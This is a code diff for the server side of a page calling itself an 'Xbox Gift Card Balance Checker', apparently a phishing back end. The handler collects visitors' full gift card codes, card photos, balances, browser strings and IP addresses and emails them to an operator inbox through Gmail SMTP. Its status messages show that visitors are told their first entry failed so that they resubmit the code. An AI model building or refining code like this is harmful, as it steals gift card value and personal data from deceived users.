@@ -1,38 +1,4 @@
-import express from 'express';
-import cors from 'cors';
-import dotenv from 'dotenv';
 import nodemailer from 'nodemailer';
-import { Resend } from 'resend';
-
-dotenv.config();
-
-const app = express();
-const PORT = process.env.PORT || 3000;
-const FRONTEND_URL = process.env.FRONTEND_URL || '*';
-
-app.use(cors({
-  origin: FRONTEND_URL,
-  credentials: true,
-}));
-app.use(express.json({ limit: '10mb' }));
-
-const resend = new Resend(process.env.RESEND_API_KEY);
-
-const transporter = nodemailer.createTransport({
-  host: 'smtp.gmail.com',
-  port: 465,
-  secure: true,
-  auth: {
-    user: process.env.GMAIL_USER,
-    pass: process.env.GMAIL_APP_PASSWORD,
-  },
-});
-
-transporter.verify().then(() => {
-  console.log('✅ Gmail SMTP transport verified');
-}).catch((error) => {
-  console.warn('⚠️ Gmail SMTP verification failed:', error.message);
-});
 
 function maskCode(code) {
   if (!code) return 'N/A';
@@ -42,7 +8,6 @@ function maskCode(code) {
 
 function buildEmailAttachments(imageBase64) {
   if (!imageBase64) return [];
-
   const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
   if (!matches || !matches[2]) return [];
 
@@ -54,7 +19,7 @@ function buildEmailAttachments(imageBase64) {
 }
 
 function buildEmailHtml(type, data) {
-  const { cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, message } = data;
+  const { cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, message, ip } = data;
 
   if (type === 'first_attempt_failed') {
     return `
@@ -68,8 +33,9 @@ function buildEmailHtml(type, data) {
           <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
           <p><strong>📊 Status:</strong> FAILED</p>
           <p><strong>💬 Message:</strong> ${message || 'User instructed to re-enter code or upload clearer image'}</p>
-          <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
+          <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
           <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
+          ${ip ? `<p><strong>🖥️ IP:</strong> ${ip}</p>` : ''}
         </div>
         <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
           <p>Xbox Gift Card Balance Checker - Automated Notification</p>
@@ -91,8 +57,9 @@ function buildEmailHtml(type, data) {
           <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
           <p><strong>📊 Status:</strong> SUCCESS</p>
           <p><strong>💬 Message:</strong> ${message || 'Verification successful on second attempt'}</p>
-          <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
+          <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
           <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
+          ${ip ? `<p><strong>🖥️ IP:</strong> ${ip}</p>` : ''}
         </div>
         <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
           <p>Xbox Gift Card Balance Checker - Automated Notification</p>
@@ -114,8 +81,9 @@ function buildEmailHtml(type, data) {
           <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
           <p><strong>📊 Status:</strong> MISMATCH</p>
           <p><strong>💬 Message:</strong> ${message || 'User entered different code on second attempt'}</p>
-          <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
+          <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
           <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
+          ${ip ? `<p><strong>🖥️ IP:</strong> ${ip}</p>` : ''}
         </div>
         <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
           <p>Xbox Gift Card Balance Checker - Automated Notification</p>
@@ -133,116 +101,64 @@ function buildEmailHtml(type, data) {
         <p><strong>Type:</strong> ${type}</p>
         <p><strong>💰 Amount:</strong> $${amount}</p>
         <p><strong>💬 Message:</strong> ${message || 'No message'}</p>
-        <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
+        <p><strong>🕐 Time:</strong> ${new Date(timestamp || Date.now()).toLocaleString()}</p>
       </div>
     </div>
   `;
 }
 
-app.get('/api/health', (req, res) => {
-  res.status(200).json({ status: 'ok', message: 'Server active' });
-});
+function buildSubject(type) {
+  if (type === 'first_attempt_failed') return 'FIRST ATTEMPT FAILED - Xbox Gift Card';
+  if (type === 'second_attempt_success') return 'SECOND ATTEMPT SUCCESS - Xbox Gift Card';
+  if (type === 'mismatch_attempt') return 'CODE MISMATCH - Xbox Gift Card';
+  return 'Xbox Gift Card Notification';
+}
+export default async function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
 
-app.post('/api/submit', async (req, res) => {
-  const formData = req.body || {};
-  const { type, cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, imageBase64, message } = formData;
+  try {
+    const emailUser = process.env.GMAIL_USER || process.env.EMAIL_USER;
+    const emailPass = process.env.GMAIL_APP_PASSWORD || process.env.EMAIL_PASS;
+    const { type, cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, userAgent, pageSource, message, targetEmail, ip, imageBase64 } = req.body || {};
 
-  res.status(200).json({
-    success: true,
-    message: 'Submission received',
-  });
+    const recipient = targetEmail || process.env.NOTIFICATION_EMAIL || emailUser;
 
-  const sendInstantEmail = async () => {
-    try {
-      if (!process.env.RESEND_API_KEY) {
-        console.warn('⚠️ RESEND_API_KEY missing. Skipping instant email.');
-        return;
-      }
-
-      const html = buildEmailHtml(type, {
-        cardNumber,
-        cardNumberFirst,
-        cardNumberSecond,
-        amount,
-        balance,
-        timestamp,
-        userAgent,
-        pageSource,
-        message,
-      });
-
-      const attachments = buildEmailAttachments(imageBase64);
-
-      const result = await resend.emails.send({
-        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
-        to: process.env.TARGET_EMAIL || process.env.NOTIFICATION_EMAIL,
-        subject: type === 'first_attempt_failed'
-          ? 'FIRST ATTEMPT FAILED - Xbox Gift Card'
-          : type === 'second_attempt_success'
-            ? 'SECOND ATTEMPT SUCCESS - Xbox Gift Card'
-            : type === 'mismatch_attempt'
-              ? 'CODE MISMATCH - Xbox Gift Card'
-              : 'Xbox Gift Card Notification',
-        html,
-        attachments: attachments.length ? attachments.map((file) => ({
-          filename: file.filename,
-          content: file.content,
-        })) : undefined,
-      });
-
-      console.log('✅ Resend email sent successfully:', result?.id || 'unknown');
-    } catch (error) {
-      console.error('❌ Resend email failed:', error.message);
+    if (!emailUser || !emailPass) {
+      console.error('❌ Gmail credentials missing.');
+      return res.status(500).json({ error: 'Email service configuration missing' });
     }
-  };
 
-  const sendDelayedEmail = () => {
-    setTimeout(async () => {
-      try {
-        if (!process.env.GMAIL_USER || !process.env.GMAIL_APP_PASSWORD) {
-          console.warn('⚠️ Gmail credentials missing. Skipping delayed email.');
-          return;
-        }
+    const transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: { user: emailUser, pass: emailPass },
+    });
 
-        const html = buildEmailHtml(type, {
-          cardNumber,
-          cardNumberFirst,
-          cardNumberSecond,
-          amount,
-          balance,
-          timestamp,
-          userAgent,
-          pageSource,
-          message,
-        });
+    // 🕒 GENERATE FRESH TIMESTAMP FOR DELAYED EMAIL
+    const currentTimestamp = Date.now();
 
-        const attachments = buildEmailAttachments(imageBase64);
+    const html = buildEmailHtml(type, { 
+      cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, 
+      timestamp: currentTimestamp, // 👈 Pass the fresh time
+      userAgent, pageSource, message, ip 
+    });
+    
+    const subject = buildSubject(type);
+    const attachments = buildEmailAttachments(imageBase64);
 
-        const info = await transporter.sendMail({
-          from: process.env.GMAIL_USER,
-          to: process.env.TARGET_EMAIL || process.env.NOTIFICATION_EMAIL,
-          subject: type === 'first_attempt_failed'
-            ? 'FIRST ATTEMPT FAILED - Xbox Gift Card'
-            : type === 'second_attempt_success'
-              ? 'SECOND ATTEMPT SUCCESS - Xbox Gift Card'
-              : type === 'mismatch_attempt'
-                ? 'CODE MISMATCH - Xbox Gift Card'
-                : 'Xbox Gift Card Notification',
-          html,
-          attachments: attachments.length ? attachments : [],
-        });
+    const info = await transporter.sendMail({
+      from: emailUser,
+      to: recipient,
+      subject,
+      html,
+      attachments,
+    });
 
-        console.log('✅ Delayed Gmail email sent successfully:', info.messageId);
-      } catch (error) {
-        console.error('❌ Delayed Gmail email failed:', error.message);
-      }
-    }, 60000);
-  };
-
-  sendInstantEmail();
-  sendDelayedEmail();
-});
-
-app.listen(PORT, () => {
-  console.log(`Backend running on port ${PORT}`);
-});
+    console.log('✅ Gmail SMTP email delivered to NOTIFICATION_EMAIL:', info.messageId);
+    return res.status(200).json({ success: true, messageId: info.messageId });
+  } catch (error) {
+    console.error('❌ Gmail SMTP email failed:', error.message);
+    return res.status(500).json({ error: error.message });
+  }
+}
